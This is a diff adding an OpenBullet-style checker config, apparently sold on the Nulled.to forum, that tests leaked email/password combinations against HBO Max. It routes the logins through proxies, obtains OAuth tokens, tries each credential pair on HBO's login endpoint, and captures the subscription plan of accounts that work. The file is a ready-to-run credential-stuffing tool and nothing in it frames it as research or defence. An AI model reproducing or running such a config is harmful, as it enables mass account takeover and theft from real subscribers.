@@ -1,0 +1,139 @@
+[SETTINGS]
+{
+  "Name": "TEST HBOMax WorldWide",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2021-06-30T13:51:45.2054014-03:00",
+  "AdditionalInfo": "-! !PAID CONFIG! !- // Proxies: Public Works AT 500CPM // Version 1.4 // Please i need to leave LATAM, HELP ME! hehe es una broma :kappa: // Virus - Nulled.to <3",
+  "Author": "Virus",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+BEGIN SCRIPT JavaScript
+function uuidv4() {
+  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+    var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
+    return v.toString(16);
+  });
+}
+var uuid = uuidv4();
+END SCRIPT -> VARS "uuid"
+###Created By @Virus
+###https://www.nulled.to/user/1284526-virus
+### Nulled.to
+
+#OAUTH/TOKENS REQUEST POST "https://oauth.api.hbo.com/auth/tokens" 
+  CONTENT "{\"client_id\":\"7161aff6-188a-4718-8d35-69c6ae58884f\",\"client_secret\":\"7161aff6-188a-4718-8d35-69c6ae58884f\",\"scope\":\"browse video_playback_free account_registration\",\"grant_type\":\"client_credentials\",\"deviceSerialNumber\":\"<uuid>\",\"clientDeviceData\":{\"paymentProviderCode\":\"google-play\"}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "X-Hbo-Client-Version: Hadron/50.35.0.280 android/50.35.0.280 (nulled im Virus/12.845.26)" 
+  HEADER "Accept: application/vnd.hbo.v9.full+json" 
+  HEADER "X-Hbo-Device-Name: android" 
+  HEADER "X-B3-TraceId: <uuid>-<uuid>" 
+  HEADER "Accept-Language: es-us" 
+  HEADER "X-Hbo-Device-Os-Version: 8.1.0" 
+  HEADER "Content-Type: application/json" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 8.1.0; virus on nulled Build/OPGS38.14-52-3-1)" 
+  HEADER "Host: oauth.api.hbo.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+
+#BEARER PARSE "<SOURCE>" JSON "access_token" -> VAR "ACCESS" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "<SOURCE>" DoesNotContain "access_token" 
+
+#Login REQUEST POST "https://gateway-latam.api.hbo.com/auth/tokens" 
+  CONTENT "{\"grant_type\":\"user_name_password\",\"scope\":\"browse video_playback device elevated_account_management\",\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Authorization: Bearer <ACCESS>" 
+  HEADER "X-Hbo-Client-Version: Hadron/50.35.0.280 android/50.35.0.280 (nulled im Virus/12.845.26)" 
+  HEADER "Accept: application/vnd.hbo.v9.full+json" 
+  HEADER "X-Hbo-Device-Name: android" 
+  HEADER "X-B3-TraceId: <uuid>-<uuid>" 
+  HEADER "Accept-Language: es-419" 
+  HEADER "X-Hbo-Device-Os-Version: 8.1.0" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 8.1.0; virus on nulled Build/OPGS38.14-52-3-1)" 
+  HEADER "Host: gateway-latam.api.hbo.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+
+#TOKEN PARSE "<SOURCE>" JSON "access_token" -> VAR "TOKEN" 
+
+#Login KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "invalid_credentials" 
+  KEYCHAIN Success OR 
+    KEY "{\"access_token\":\"" 
+
+REQUEST POST "https://comet-latam.api.hbo.com/content" 
+  CONTENT "[{\"id\":\"urn:hbo:billing-status:mine\",\"headers\":{}}]" 
+  CONTENTTYPE "application/json" 
+  HEADER "Authorization: Bearer <TOKEN>" 
+  HEADER "X-Hbo-Client-Version: Hadron/50.35.0.280 android/50.35.0.280 (moto e5 play/8.1.0)" 
+  HEADER "Accept: application/vnd.hbo.v9.full+json" 
+  HEADER "X-Hbo-Device-Name: android" 
+  HEADER "X-B3-TraceId: <uuid>-<uuid>" 
+  HEADER "Accept-Language: es-419" 
+  HEADER "X-Hbo-Device-Os-Version: 8.1.0" 
+  HEADER "Content-Type: application/json" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 8.1.0; moto e5 play Build/OPGS28.54-53-8-9)" 
+  HEADER "Host: comet-latam.api.hbo.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+
+#INFO PARSE "<SOURCE>" LR "billingInformationMessage\": \"" "\"" -> VAR "Status" 
+
+#Plan PARSE "<SOURCE>" LR "Current Plan:" "(s" CreateEmpty=FALSE -> CAP "Plan" 
+
+KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "You’re not subscribed to HBO Max" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "expired" 
+  KEYCHAIN Success OR 
+    KEY "Current Plan" 
+
+!#THANKS_FOR_BUY_THIS_CONFIG_<3 FUNCTION Constant 
+
